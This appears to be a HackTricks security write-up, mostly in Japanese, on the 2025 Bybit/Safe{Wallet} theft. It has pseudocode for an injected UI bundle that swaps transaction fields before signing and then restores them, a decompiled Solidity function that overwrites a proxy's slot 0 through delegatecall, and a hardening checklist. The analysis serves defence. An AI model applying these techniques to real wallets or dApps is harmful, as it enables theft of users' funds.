# Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## 概要

コールドウォレットの窃盗チェーンは、**supply-chain compromise of the Safe{Wallet} web UI** と **on-chain delegatecall primitive that overwrote a proxy’s implementation pointer (slot 0)** を組み合わせたものだった。主なポイントは次のとおりです:

- dAppが署名パスにコードを注入できる場合、署名者に有効な **EIP-712 signature over attacker-chosen fields** を生成させつつ、元のUIデータを復元して他の署名者に気付かれないようにできる。
- Safeプロキシは `masterCopy`（実装）を **storage slot 0** に格納する。slot 0 に書き込むコントラクトへの delegatecall は、Safe を攻撃者のロジックに事実上“アップグレード”し、ウォレットの完全な制御を与える。

## オフチェーン: Targeted signing mutation in Safe{Wallet}

改ざんされた Safe バンドル（`_app-*.js`）は、特定の Safe と signer アドレスを選択的に攻撃した。注入されたロジックは署名呼び出し直前に実行された:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### 攻撃の性質
- **Context-gated**: 被害者の Safe/署名者向けにハードコードされた許可リストがノイズを抑え、検出を低下させた。
- **Last-moment mutation**: フィールド（`to`, `data`, `operation`, gas）は`signTransaction`の直前に上書きされ、その後戻されたため、UI上の提案ペイロードは無害に見えるが、署名は攻撃者のペイロードに一致していた。
- **EIP-712 opacity**: ウォレットは構造化データを表示したが、ネストされた calldata をデコードせず、`operation = delegatecall` を強調表示しなかったため、変異したメッセージが事実上ブラインド署名されてしまった。

### Gateway validation relevance
Safe 提案は **Safe Client Gateway** に提出される。ハード化された検査の前は、UI が署名後にフィールドを書き換えた場合、`safeTxHash`/署名が JSON ボディの異なるフィールドに対応していてもゲートウェイは提案を受け入れることができた。事件後、ゲートウェイは送信されたトランザクションとハッシュ/署名が一致しない提案を拒否するようになった。同様のサーバーサイドでのハッシュ検証は、あらゆる signing-orchestration API に対して強制されるべきである。

### 2025 Bybit/Safe incident highlights
- 2025年2月21日の Bybit コールドウォレット流出（~401k ETH）は同じパターンを再利用した：侵害された Safe S3 バンドルは Bybit の署名者に対してのみ起動し、`operation=0` → `1` を入れ替えて、`to` を事前デプロイされた攻撃者コントラクト（slot 0 に書き込む）に向けた。
- Wayback にキャッシュされた `_app-52c9031bfa03da47.js` は、ロジックが Bybit の Safe (`0x1db9…cf4`) と署名者アドレスに基づいて動作し、実行から2分後にクリーンなバンドルに即座にロールバックされたことを示しており、"変異 → 署名 → 復元" のトリックを反映している。
- 悪意のあるコントラクト（例: `0x9622…c7242`）は、`sweepETH/sweepERC20` のような単純な関数と、実装スロットを書き換える `transfer(address,uint256)` を含んでいた。`execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` の実行によりプロキシの実装が切り替わり、完全な制御が与えられた。

## On-chain: Delegatecall proxy takeover via slot collision

Safe のプロキシは `masterCopy` を **storage slot 0** に保持し、すべてのロジックをそこに委譲している。Safe が **`operation = 1` (delegatecall)** をサポートしているため、任意の署名済みトランザクションが任意のコントラクトを指し、プロキシのストレージコンテキスト内でそのコードを実行できる。

攻撃者コントラクトは ERC-20 の `transfer(address,uint256)` を模倣したが、代わりに `_to` をスロット0に書き込んだ:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
実行経路:
1. 被害者は `execTransaction` に対して `operation = delegatecall`、`to = attackerContract`、`data = transfer(newImpl, 0)` を署名する。
2. `masterCopy` はこれらのパラメータに対する署名を検証する。
3. Proxy が `attackerContract` に対して delegatecall を実行する；`transfer` の本体が slot 0 に書き込まれる。
4. Slot 0（`masterCopy`）が攻撃者制御のロジックを指すようになる → **ウォレットの完全乗っ取りと資金の流出**。

### Guard & version notes (post-incident hardening)
- Safes >= v1.3.0 は **Guard** をインストールして `delegatecall` を拒否したり、`to`/セレクタに対する ACL を適用したりできる；Bybit は v1.1.1 を実行していたため Guard フックは存在しなかった。コントラクトをアップグレードし（オーナーの再追加を含む）、この制御プレーンを得る必要がある。

## Detection & hardening checklist

- **UI integrity**: JS アセットをピン／SRI を使用；バンドル差分を監視；サイン用 UI を信頼境界の一部として扱う。
- **Sign-time validation**: ハードウェアウォレットでの **EIP-712 clear-signing**；`operation` を明示表示し、ネストした calldata をデコードする。ポリシーが許可しない限り `operation = 1` の署名は拒否する。
- **Server-side hash checks**: 提案を中継するゲートウェイ／サービスは `safeTxHash` を再計算し、署名が提出されたフィールドと一致することを検証する必要がある。
- **Policy/allowlists**: `to`、セレクタ、資産タイプに対するプレフライトルールを設定し、検証済みフローを除いて delegatecall を禁止する。完全に署名されたトランザクションをブロードキャストする前に内部ポリシーサービスを必須にする。
- **Contract design**: マルチシグ／トレジャリーウォレットで任意の delegatecall を不用意に公開しない。アップグレードポインタを slot 0 から離して配置するか、明示的なアップグレードロジックとアクセス制御で保護する。
- **Monitoring**: トレジャリー資金を保有するウォレットからの delegatecall 実行や、`operation` が通常の `call` パターンから変更される提案に対してアラートを出す。

## References

- [AnChain.AI forensic breakdown of the Bybit Safe exploit](https://www.anchain.ai/blog/bybit)
- [Zero Hour Technology analysis of the Safe bundle compromise](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
